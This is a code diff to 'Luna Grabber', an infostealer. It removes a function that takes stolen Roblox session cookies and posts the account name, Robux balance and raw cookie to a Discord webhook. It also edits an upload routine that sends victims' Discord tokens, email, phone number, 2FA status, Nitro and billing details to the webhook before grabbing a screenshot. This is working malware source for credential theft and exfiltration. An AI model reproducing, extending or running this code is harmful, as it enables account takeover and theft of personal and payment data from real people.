@@ -126,58 +126,6 @@ class Discord:
 									self.tokens.append(token)
 									self.ids.append(uid)
 
-	def robloxinfo(self, webhook):
-		if __CONFIG__["roblox"]:
-			with open(os.path.join(temp_path, "Browser", "roblox cookies.txt"), 'r', encoding="utf-8") as f:
-				robo_cookie = f.read().strip()
-				if robo_cookie == "No Roblox Cookies Found":
-					pass
-				else:
-					headers = {"Cookie": ".ROBLOSECURITY=" + robo_cookie}
-					info = None
-					try:
-						response = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers)
-						response.raise_for_status()
-						info = response.json()
-					except requests.exceptions.HTTPError:
-						pass
-					except requests.exceptions.RequestException:
-						pass
-					if info is not None:
-						data = {
-							"embeds": [
-								{
-									"title": "Roblox Info",
-									"color": 5639644,
-									"fields": [
-										{
-											"name": "<:roblox_icon:1041819334969937931> Name:",
-											"value": f"`{info['UserName']}`",
-											"inline": True
-										},
-										{
-											"name": "<:robux_coin:1041813572407283842> Robux:",
-											"value": f"`{info['RobuxBalance']}`",
-											"inline": True
-										},
-										{
-											"name": "🍪 Cookie:",
-											"value": f"`{robo_cookie}`"
-										}
-									],
-									"thumbnail": {
-										"url": info['ThumbnailUrl']
-									},
-									"footer": {
-										"text": "Luna Grabber | Created By Smug"
-									},
-								}
-							],
-							"username": "Luna",
-							"avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
-						}
-						requests.post(webhook, json=data)
-
 	def upload(self, webhook):
 		for token in self.tokens:
 			if token in self.tokens_sent:
@@ -200,22 +148,22 @@ class Discord:
 			phone = user['phone']
 			email = user['email']
 
-			mfa = "✅" if user.get('mfa_enabled') else "❌"
+			mfa = ":white_check_mark:" if user.get('mfa_enabled') else ":x:"
 
 			premium_types = {
-				0: "❌",
+				0: ":x:",
 				1: "Nitro Classic",
 				2: "Nitro",
 				3: "Nitro Basic"
 			}
-			nitro = premium_types.get(user.get('premium_type'), "❌")
+			nitro = premium_types.get(user.get('premium_type'), ":x:")
 
 			if "message" in payment or payment == []:
-				methods = "❌"
+				methods = ":x:"
 			else:
-				methods = "".join(["💳" if method['type'] == 1 else "<:paypal:973417655627288666>" if method['type'] == 2 else "❓" for method in payment])
+				methods = "".join(["💳" if method['type'] == 1 else "<:paypal:973417655627288666>" if method['type'] == 2 else ":question:" for method in payment])
 
-			val += f'<:1119pepesneakyevil:972703371221954630> **Discord ID:** `{discord_id}` \n<:gmail:1051512749538164747> **Email:** `{email}`\n:mobile_phone: **Phone:** `{phone}`\n\n🔐 **2FA:** {mfa}\n<a:nitroboost:996004213354139658> **Nitro:** {nitro}\n<:billing:1051512716549951639> **Billing:** {methods}\n\n<:crown1:1051512697604284416> **Token:** `{token}`\n'
+			val += f'<:1119pepesneakyevil:972703371221954630> **Discord ID:** `{discord_id}` \n<:gmail:1051512749538164747> **Email:** `{email}`\n:mobile_phone: **Phone:** `{phone}`\n\n:closed_lock_with_key: **2FA:** {mfa}\n<a:nitroboost:996004213354139658> **Nitro:** {nitro}\n<:billing:1051512716549951639> **Billing:** {methods}\n\n<:crown1:1051512697604284416> **Token:** `{token}`\n'
 
 			data = {
 				"embeds": [
@@ -242,8 +190,6 @@ class Discord:
 
 			requests.post(webhook, json=data)
 			self.tokens_sent.append(token)
-
-		self.robloxinfo(webhook)
 
 		image = ImageGrab.grab(
 			bbox=None,
